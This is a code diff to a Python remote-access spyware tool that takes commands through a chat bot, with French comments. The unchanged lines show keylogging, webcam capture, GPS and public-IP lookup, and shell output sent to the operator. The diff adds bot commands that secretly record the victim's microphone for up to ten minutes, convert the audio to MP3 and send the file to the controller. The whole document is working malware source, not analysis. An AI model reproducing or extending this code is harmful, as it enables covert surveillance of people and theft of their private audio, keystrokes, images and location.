@@ -1,4 +1,4 @@
-import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2
+import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2, pyaudio, wave, audioop, pydub, ffmpeg
  
 """
 pip install requests geocoder mss keyboard pathlib opencv-python
@@ -19,7 +19,69 @@ Envoyer photo ou document
 /purgeall
 /getPublicIP
 /webcam_capture
+/record_sound_start (10 min max)
+/record_sound_stop
 """
+
+
+def recordSound():
+	
+	chunk = 1024  
+	sample_format = pyaudio.paInt16 
+	channels = 1
+	fs = 44100 
+	seconds = 600
+	filename = f"{maindir}\\output.wav"
+	filename_mp3 = f"{maindir}\\output.mp3"
+
+
+	p = pyaudio.PyAudio() 
+	
+	sendMessage("Enregistrement...")
+	print('Recording')
+
+	stream = p.open(format=sample_format,
+					channels=channels,
+					rate=fs,
+					frames_per_buffer=chunk,
+					input=True)
+
+	frames = []
+
+	for i in range(0, int(fs / chunk * seconds)):
+		
+		if recording:
+			
+			data = stream.read(chunk)
+			rms = audioop.rms(data, 2)
+			if rms > 50:
+				print(rms)
+				frames.append(data)
+		
+		else:
+			break
+	
+	stream.stop_stream()
+	stream.close()
+	p.terminate()
+	
+	sendMessage("Enregistrement termine")
+	print('Finished recording')
+
+	wf = wave.open(filename, 'wb')
+	wf.setnchannels(channels)
+	wf.setsampwidth(p.get_sample_size(sample_format))
+	wf.setframerate(fs)
+	wf.writeframes(b''.join(frames))
+	wf.close()
+	
+	
+	#sound = pydub.AudioSegment.from_wav(filename)
+	#sound.export(filename_mp3, format='mp3')
+	
+	ffmpeg.input(filename).output(filename_mp3, loglevel="quiet").run(overwrite_output=True)
+	sendDocument(filename_mp3)
+	
 
 def takeWebcamPhoto():
 	
@@ -80,6 +142,7 @@ def get_current_gps_coordinates():
 
 
 startdir = pathlib.Path(__file__).parent.resolve()
+#sys.path.append(f"{startdir}\\ffmpeg.exe")
 if not pathlib.Path(f"{startdir}\\credentials.txt").exists():
 	print("identifiants requis dans credentials.txt")
 	input()
@@ -99,7 +162,9 @@ print(f"{appname} started")
 
 first = True
 last_update = 0
+recording = False
 keylogging = True
+
 last_time_recieved = round(datetime.datetime.now().timestamp())
 
  
@@ -136,7 +201,8 @@ while True:
 			
 			if last_message['message']['date'] > last_time_recieved:
 				
-				last_time_recieved = round(datetime.datetime.now().timestamp())
+				#last_time_recieved = round(datetime.datetime.now().timestamp())
+				last_time_recieved = last_message['message']['date']
 				
 				if 'photo' in last_message['message']:
 					
@@ -235,6 +301,13 @@ while True:
 				elif "/webcam_capture" in last_message['message']['text']:
 					takeWebcamPhoto()
 					
+				elif "/record_sound_start" in last_message['message']['text']:
+					recording = True
+					record_sound = threading.Thread(target=recordSound)
+					record_sound.start()
+				
+				elif "/record_sound_stop" in last_message['message']['text']:
+					recording = False
 				
 				out = subprocess.getoutput("cd")
 				sendMessage(f"/man {out}>")
